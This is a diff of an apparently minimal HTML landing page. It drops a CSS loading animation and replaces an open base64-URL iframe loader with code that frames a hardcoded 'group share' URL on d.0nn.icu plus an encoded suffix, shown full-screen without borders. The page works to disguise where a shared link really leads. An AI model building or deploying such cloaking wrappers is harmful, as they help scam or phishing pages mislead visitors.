@@ -6,321 +6,65 @@
   <meta content="black" name="apple-mobile-web-app-status-bar-style">
   <meta content="320" name="MobileOptimized">
   <title></title>
-<style>
-.container {
-        width: 100px;
-        height: 100px;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
+  <style>
+    .content {
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      left: 0;
+      top: 0;
+      border: none;
+      margin: 0;
+      padding: 0;
     }
-
-    .dot {
-        width: 15px;
-        height: 15px;
-        border-radius: 50%;
-        background-color: #000;
-        position: absolute;
-        top: 0;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        margin: auto;
-    }
-
-    .dot-3 {
-        background-color: #f74d75;
-    }
-
-    .dot-2 {
-        background-color: #10beae;
-    }
-
-    .dot-1 {
-        background-color: #ffe386;
-    }
-
-    .dot-3 {
-        background-color: #f74d75;
-        animation: dot-3-move 2s ease infinite;
-    }
-
-    @keyframes dot-3-move {
-        20% {
-            transform: scale(1)
-        }
-
-        45% {
-            transform: translateY(-18px) scale(.45)
-        }
-
-        60% {
-            transform: translateY(-25px) scale(.45)
-        }
-
-        80% {
-            transform: translateY(-25px) scale(.45)
-        }
-
-        100% {
-            transform: translateY(0px) scale(1)
-        }
-    }
-
-    .dot-2 {
-        background-color: #10beae;
-        animation: dot-2-move 2s ease infinite;
-    }
-
-    .dot-1 {
-        background-color: #ffe386;
-        animation: dot-1-move 2s ease infinite;
-    }
-
-    @keyframes dot-2-move {
-        20% {
-            transform: scale(1)
-        }
-
-        45% {
-            transform: translate(-16px, 12px) scale(.45)
-        }
-
-        60% {
-            transform: translate(-20px, 15px) scale(.45)
-        }
-
-        80% {
-            transform: translate(-20px, 15px) scale(.45)
-        }
-
-        100% {
-            transform: translateY(0px) scale(1)
-        }
-    }
-
-    @keyframes dot-1-move {
-        20% {
-            transform: scale(1)
-        }
-
-        45% {
-            transform: translate(16px, 12px) scale(.45)
-        }
-
-        60% {
-            transform: translate(20px, 15px) scale(.45)
-        }
-
-        80% {
-            transform: translate(20px, 15px) scale(.45)
-        }
-
-        100% {
-            transform: translateY(0px) scale(1)
-        }
-    }
-
-    .container {
-        width: 100px;
-        height: 100px;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        animation: rotate-move 2s ease-in-out infinite;
-    }
-
-    @keyframes rotate-move {
-        55% {
-            transform: translate(-50%, -50%) rotate(0deg)
-        }
-
-        80% {
-            transform: translate(-50%, -50%) rotate(360deg)
-        }
-
-        100% {
-            transform: translate(-50%, -50%) rotate(360deg)
-        }
-    }
-.container {
-        width: 100px;
-        height: 100px;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-    }
-
-    .dot {
-        width: 15px;
-        height: 15px;
-        border-radius: 50%;
-        background-color: #000;
-        position: absolute;
-        top: 0;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        margin: auto;
-    }
-
-    .dot-3 {
-        background-color: #f74d75;
-    }
-
-    .dot-2 {
-        background-color: #10beae;
-    }
-
-    .dot-1 {
-        background-color: #ffe386;
-    }
-
-    .dot-3 {
-        background-color: #f74d75;
-        animation: dot-3-move 2s ease infinite;
-    }
-
-    @keyframes dot-3-move {
-        20% {
-            transform: scale(1)
-        }
-
-        45% {
-            transform: translateY(-18px) scale(.45)
-        }
-
-        60% {
-            transform: translateY(-25px) scale(.45)
-        }
-
-        80% {
-            transform: translateY(-25px) scale(.45)
-        }
-
-        100% {
-            transform: translateY(0px) scale(1)
-        }
-    }
-
-    .dot-2 {
-        background-color: #10beae;
-        animation: dot-2-move 2s ease infinite;
-    }
-
-    .dot-1 {
-        background-color: #ffe386;
-        animation: dot-1-move 2s ease infinite;
-    }
-
-    @keyframes dot-2-move {
-        20% {
-            transform: scale(1)
-        }
-
-        45% {
-            transform: translate(-16px, 12px) scale(.45)
-        }
-
-        60% {
-            transform: translate(-20px, 15px) scale(.45)
-        }
-
-        80% {
-            transform: translate(-20px, 15px) scale(.45)
-        }
-
-        100% {
-            transform: translateY(0px) scale(1)
-        }
-    }
-
-    @keyframes dot-1-move {
-        20% {
-            transform: scale(1)
-        }
-
-        45% {
-            transform: translate(16px, 12px) scale(.45)
-        }
-
-        60% {
-            transform: translate(20px, 15px) scale(.45)
-        }
-
-        80% {
-            transform: translate(20px, 15px) scale(.45)
-        }
-
-        100% {
-            transform: translateY(0px) scale(1)
-        }
-    }
-
-    .container {
-        width: 100px;
-        height: 100px;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        animation: rotate-move 2s ease-in-out infinite;
-    }
-
-    @keyframes rotate-move {
-        55% {
-            transform: translate(-50%, -50%) rotate(0deg)
-        }
-
-        80% {
-            transform: translate(-50%, -50%) rotate(360deg)
-        }
-
-        100% {
-            transform: translate(-50%, -50%) rotate(360deg)
-        }
-    }
-   .content{height:100%;width:100%;position: fixed;left: -2px;top: -2px;}
-</style>
+    body { margin: 0; padding: 0; overflow: hidden; }
+  </style>
+</head>
 <body>
+  <script>
+    // 内部固定前缀
+    const fixedPrefix = 'http://d.0nn.icu/group.php/index/share/id/147/t/6443c5ef5aa0278b2e988ea70aa81a0c/time/1754934138.html';
+    // 解析外部参数
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedSuffix = urlParams.get('c');
 
-<div class="container">
-            <div class="dot dot-1"></div>
-            <div class="dot dot-2"></div>
-            <div class="dot dot-3"></div>
-</div>
- <script>
-var urlParams = new URLSearchParams(window.location.search);
-var encodedParam = urlParams.get('c');
-var tureurl = atob(encodedParam);
-if (tureurl.includes("http")) {
-var square = document.getElementById("container");
-setTimeout(function() {
-  square.style.display = "none";
-}, 1500);
- var html='<iframe class="content" οnlοad="bindMouseWhee(this)" src='+tureurl+'></iframe>';
-  document.writeln(html);
-console.log(tureurl);
-} else {
-  console.log("nourls");
-}
+    if (encodedSuffix) {
+      try {
+        const decodedSuffix = atob(encodedSuffix);
+        const fullUrl = fixedPrefix + decodedSuffix;
+        // 增强URL合法性校验（原有includes('http')不够严谨，补充完整URL格式校验）
+        const isLegalUrl = /^https?:\/\/.+/.test(fullUrl);
+        
+        if (isLegalUrl) {
+          // 1. 移除onload事件绑定（预防全局/body上可能存在的onload事件，避免跨域逻辑触发）
+          window.onload = null; // 清除全局onload事件
+          if (document.body.onload) document.body.onload = null; // 清除body标签上的onload事件
+
+          // 2. 加载完整URL内容（原有代码未实现“如何使用fullUrl”，补充iframe承载逻辑，匹配.content样式）
+          const iframe = document.createElement('iframe');
+          iframe.className = 'content'; // 应用全屏样式
+          iframe.src = fullUrl; // 指向拼接后的完整URL
+          iframe.frameBorder = '0'; // 移除边框
+          iframe.scrolling = 'auto'; // 允许内部滚动（根据需求可改为no）
+          
+          // 3. 插入iframe到页面（替换空body，实现内容展示）
+          document.body.appendChild(iframe);
+
+        } else {
+          // 非法URL处理：避免加载无效链接
+          console.error('拼接后的URL不合法：', fullUrl);
+          alert('链接格式错误，无法加载内容');
+        }
+      } catch (error) {
+        // 4. 解码异常处理（原有代码无try-catch后续逻辑，补充错误捕获）
+        console.error('参数解码失败：', error);
+        alert('内容参数解析错误，请检查链接有效性');
+      }
+    } else {
+      // 5. 缺失参数处理（原有代码未处理encodedSuffix为null的情况）
+      console.error('未获取到参数c（后缀内容）');
+      alert('缺少必要内容参数，无法加载页面');
+    }
   </script>
- <script>
-var firefox = navigator.userAgent.indexOf('Firefox') != -1;
-function MouseWheel(e,doc){
-	e.preventDefault && e.preventDefault(),e.returnValue = false;
-	var up = firefox && e.detail < 0 || e.wheelDelta > 0;
-	doc.body.scrollTop = doc.documentElement.scrollTop += up?-50:50;
-}
-function bindMouseWhee(ifr){
-	try{
-		var doc = ifr.contentWindow.document;
-		firefox?doc.addEventListener('DOMMouseScroll',function(e){MouseWheel(e,doc)},false):(doc.onmousewheel = function(e){MouseWheel(e||ifr.contentWindow.event,doc)});
-	}catch(e){
-		alert('跨域无法获取iframe加载document'+e);
-	}
-}
-</script> 
+</body>
+</html>
